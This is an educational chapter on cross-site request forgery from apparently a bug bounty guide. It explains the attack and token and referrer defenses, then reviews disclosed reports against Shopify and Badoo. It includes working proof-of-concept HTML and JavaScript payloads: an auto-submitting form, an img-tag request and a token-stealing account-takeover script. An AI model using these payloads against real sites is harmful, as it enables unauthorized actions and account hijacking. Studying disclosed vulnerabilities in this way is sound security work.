@@ -1,1 +1,182 @@
+Cross-Site Request Forgery
+Description
+A Cross-Site Request Forgery, or CSRF, attack occurs when a malicious website, email,
+instant message, application, etc. causes a user’s web browser to perform some action
+on another website where that user is already authenticated, or logged in. Often this
+occurs without the user knowing the action has occurred.
+
+The impact of a CSRF attack depends on the website which is receiving the action. Here’s
+an example:
+1. Bob logs into his bank account, performs some banking but does not log out.
+2. Bob checks his email and clicks a link to an unfamiliar website.
+3. The unfamiliar website makes a request to Bob’s banking website to transfer money
+passing in cookie information stored from Bob’s banking session in step 1.
+4. Bob’s banking website receives the request from the unfamiliar (malicious) website,
+without using a CSRF token and processes the transfer.
+
+Even more interesting is the idea that the link to the malicious website could be contained
+in valid HTML which does not require Bob to click on the link, <img src=”www.malicious_-
+site.com”>. If Bob’s device (i.e., browser) renders this image, it will make the request to
+malicious_site.com and potentially kick off the CSRF attack.
+
+Now, knowing the dangers of CSRF attacks, they can be mitigated a number of ways,
+perhaps the most popular is a CSRF token which must be submitted with potentially
+data altering requests (i.e., POST requests). Here, a web application (like Bob’s bank)
+would generate a token with two parts, one which Bob would receive and one which the
+application would retain.
+
+When Bob attempts to make transfer requests, he would have to submit the token which
+the bank would then validate with its side of the token.
+
+Now, with regards to CSRF and CSRF tokens, it seems like Cross Origin Resource Sharing
+(CORS) is becoming more common, or I’m just noticing it more as I explore more targets.
+Essentially, CORS restricts resources, including json responses, from being accessed by
+a domain outside of that which served the file. In other words, when CORS is used to
+protect a site, you can’t write Javascript to call the target application, read the response
+and make another call, unless the target site allows it.
+
+If this seems confusing, with Javascript, try calling HackerOne.com/activity.json, reading
+the response and making a second call. You’ll also see the importance of it and potential
+work arounds in Example #3 below.
+
+Lastly, it’s important to note (thanks to Jobert Abma for flagging), that not every request
+without as CSRF token is a valid CSRF issue. Some websites may perform additional
+checks like comparing the referrer header (though this isn’t foolproof and there have
+been cases where this was bypassed). This is a field that identifies the address of the
+webpage that linked to the resource being requested. In other words, if the referrer on a
+POST call is not from the same site receiving the HTTP request, the site may disallow the
+call thereby achieving the same effect as validating a CSRF token. Additionally, not every
+site refers to or users the term csrf when creating or defining a token. For example, on
+Badoo it is the rt parameter as discussed below
+
+1. Shopify Export Installed Users
+Description:
+Shopify’s API provides an endpoint for exporting a list of installed users, via the URL
+provided above. A vulnerability existed where a website could call that Endpoint and
+read in information as Shopify did not include any CSRF token validation to that call.
+As a result, the following HTML code could be used to submit the form on behalf of an
+unknowing victim:
+
+<html>
+<head><title>csrf</title></head>
+<body onLoad="document.forms[0].submit()">
+<form action="https://app.shopify.com/services/partners/api_clients/1105664/\
+export_installed_users" method="GET">
+</form>
+</body>
+</html>
+
+Here, by just visiting the site, Javascript submits the form which actually includes a GET
+call to Shopify’s API with the victim’s browser supplying its cookie from Shopify.
+
+Takeaways
+Broaden your attack scope and look beyond a site’s website to its API endpoints.
+APIs offer great potential for vulnerabilities so it is best to keep both in mind,
+especially when you know that an API may have been developed or made
+available for a site well after the actual website was developed.
+
+2. Shopify Twitter Disconnect
+Description:
+Shopify provides integration with Twitter to allow shop owners to tweet about their
+products. Similarly, it also provides functionality to disconnect a Twitter account from
+a connected shop.
+
+The URL to disconnect a Twitter account is referenced above. When making the call,
+Shopify did not validate the CSRF token which would have allowed a malicious person
+to make a GET call on the victim’s behalf, thereby disconnecting the victim’s store from
+Twitter.
+
+In providing the report, WeSecureApp provided the following example of a vulnerable
+request - note the use of an img tag below which makes the call to the vulnerable URL:
+
+GET /auth/twitter/disconnect HTTP/1.1
+Host: twitter-commerce.shopifyapps.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/2010010\
+1 Firefox/43.0
+Accept: text/html, application/xhtml+xml, application/xml
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://twitter-commerce.shopifyapps.com/account
+Cookie: _twitter-commerce_session=REDACTED
+>Connection: keep-alive
+Since the browser performs a GET request to get the image at the given URL and no CSRF
+token is validated, a user’s store is now disconnected:
+<html>
+<body>
+<img src="https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect">
+</body>
+</html>
+
+Takeaways
+In this situation, this vulnerability could have been found by using a proxy server,
+like Burp or Firefox’s Tamper Data, to look at the request being sent to Shopify
+and noting that this request was being performed with by way of a GET request.
+Since this was destructive action and GET requests should never modify any data
+on the server, this would be a something to look into.
+
+3. Badoo Full Account Takeover
+Description:
+If you check Badoo out, you’ll realize that they protect against CSRF by including a URL
+parameter, rt, which is only 5 digits long (at least at the time of writing). While I noticed
+this when Badoo went live on HackerOne, I couldn’t find a way to exploit this. However,
+Mahmoud Jamal (zombiehelp54) did.
+
+Recognizing the rt parameter and its value, he also noticed that the parameter was
+returned in almost all json responses. Unfortunately this wasn’t helpful as Cross Origin
+Resource Sharing (CORS) protects Badoo from attackers reading those responses. So
+Mahmoud kept digging.
+
+Turns out, the file https://eu1.badoo.com/worker-scope/chrome-service-worker.js contained the
+rt value. Even better is this file can be read arbitrarily by an attacker without needing the
+victim to do anything except visit the malicious web page. Here’s the code he provided:
+
+<html>
+<head>
+<title>Badoo account take over</title>
+<script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></s\
+cript>
+</head>
+<body>
+<script>
+function getCSRFcode(str) {
+return str.split('=')[2];
+}
+window.onload = function(){
+var csrf_code = getCSRFcode(url_stats);
+csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3yfn2SFUBear\
+08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3e0\
+37ff54b560..a810&prompt=none&rt='+ csrf_code;
+window.location = csrf_url;
+};
+</script>
+
+Essentially, when a victim loads this page, it will call the Badoo script, take the rt
+parameter for the user and then make a call on the victim’s behalf. In this case, it was to
+link Mahmoud’s account with the victim’s, essentially completing an account take over.
+
+Takeaways
+Where there is smoke, there’s fire. Here, Mahmoud noticed that the rt parameter
+was being returned in different locations, in particular json responses. Because
+of that, he rightly guessed it may show up somewhere that could be exploited -
+in this case a js file.
+
+Going forward, if you feel like something is off, keep digging. Using Burp, check
+all the resources that are being called when you visit a target site / application.
+
+Summary
+CSRF represent another vector for attack and may be executed without a victim even
+knowing or actively performing an action. Finding CSRF vulnerabilities may take some
+ingenuity and again, a desire to test everything.
+
+Generally, web forms are uniformly protected by application frameworks like Rails if the
+site is performing a POST request but APIs can be a different story. For example, Shopify
+is written primarily using the Ruby on Rails framework which provides CSRF protection
+for all forms by default (though it can be turned off). However, clearly this isn’t necessarily
+the case for API’s created with the framework. Lastly, be on the lookout for any calls which
+change server data (like delete actions) which are being performed by a GET request.
+
+
+
+
+
 
